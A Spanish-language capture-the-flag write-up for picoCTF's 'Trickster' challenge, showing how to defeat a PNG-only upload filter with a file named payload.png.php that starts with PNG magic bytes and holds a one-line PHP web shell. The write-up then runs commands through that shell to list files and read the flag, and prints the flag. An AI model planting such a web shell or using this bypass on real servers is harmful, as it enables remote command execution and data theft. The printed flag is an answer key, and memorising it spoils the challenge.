## Trickster

## Descripcion
I found a web app that can help process images: PNG images only!
## Solucion
si revisamos la pagina del reto vemos que debemos subir archivos png, probe con una imagen cualquiera y me dijo esto: Error: The file is not a valid PNG image: ffd8ffe0
entonces procedemos a  revisar el archivo robots.txt:
User-agent: *
Disallow: /instructions.txt
Disallow: /uploads/

ahora revisamos instructions.txt:
Let's create a web app for PNG Images processing.
It needs to:
Allow users to upload PNG images
	look for ".png" extension in the submitted files
	make sure the magic bytes match (not sure what this is exactly but wikipedia says that the first few bytes contain 'PNG' in hexadecimal: "50 4E 47" )
after validation, store the uploaded files so that the admin can retrieve them later and do the necessary processing.

creamos un archivo con lo siguiente:
PNG
IHDR
<?php system($_GET['cmd']); ?>
y lo nombramos payload.png.php
lo subimos a la pagina del reto y nos dice lo siguiente:
File uploaded successfully and is a valid PNG file. We shall process it and get back to you... Hopefully
revisando otra vez el archivo robots.txt vemos que las imagenes se supone que se guardan en /uploads/ entramos a esa direccion con el nombre de nuestro archivo:
http://atlas.picoctf.net:64137/uploads/payload.png.php
y nos muestra lo siguiente:
PNG IHDR  
**Warning**: Undefined array key "cmd" in **/var/www/html/uploads/payload.png.php** on line **3**  
  
**Fatal error**: Uncaught ValueError: system(): Argument #1 ($command) cannot be empty in /var/www/html/uploads/payload.png.php:3 Stack trace: #0 /var/www/html/uploads/payload.png.php(3): system('') #1 {main} thrown in **/var/www/html/uploads/payload.png.php** on line **3**

vamos en buen camino ahora podemos revisar que y que hay en ese directorio con lo siguiente:
http://atlas.picoctf.net:64137/uploads/payload.png.php?cmd=ls%20../
y vemos que esta un archivo .txt con nombre raro
PNG IHDR GNTDOMBWGIZDE.txt index.php instructions.txt robots.txt uploads

si lo revisamos con un cat y la direccion donde se encuentra
http://atlas.picoctf.net:64137/uploads/payload.png.php?cmd=cat%20/var/www/html/GNTDOMBWGIZDE.txt
nos dara la bandera:
PNG IHDR /* picoCTF{c3rt!fi3d_Xp3rt_tr1ckst3r_3f706222} */
## Notas
- 
## Referencias
- 